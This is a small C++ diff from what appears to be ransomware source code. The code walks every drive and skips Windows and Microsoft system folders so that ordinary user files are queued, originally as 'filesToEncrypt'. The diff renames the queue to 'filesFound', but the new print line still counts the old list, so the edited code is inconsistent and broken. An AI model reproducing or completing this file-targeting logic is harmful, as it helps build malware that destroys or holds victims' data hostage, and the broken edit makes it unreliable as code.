@@ -6,6 +6,7 @@
 #include <filesystem>
 #include <thread>
 #include <experimental/filesystem>
+std::vector<std::string> filesFound = {}; 
 std::vector<std::string> getListOfDrives( ) {
     std::vector<std::string> arrayOfDrives;
     char* szDrives = new char[ MAX_PATH ]( );
@@ -48,9 +49,9 @@ void enumerateDriveFiles( std::string drive ) {
         if ( !shouldEncryptThisEntry( dirEntry.path( ).string( ), { "Windows","windows","Microsoft","microsoft","Win32","BaseImages" } ) 
             || !shouldEncryptThisWEntry( dirEntry.path( ).wstring( ), { L"\u202E" } ) )
             continue;
-        filesToEncrypt.push_back(dirEntry.path( ).string( ));
+        filesFound.push_back( dirEntry.path( ).string( ) );
         clearConsole( );
-        std::cout << "Files queued for encryption: " << filesToEncrypt.size( ) << std::endl;
+        std::cout << "Files found: " << filesToEncrypt.size( ) << std::endl;
     }
 }
 int main( int argc, char* argv[ ] )
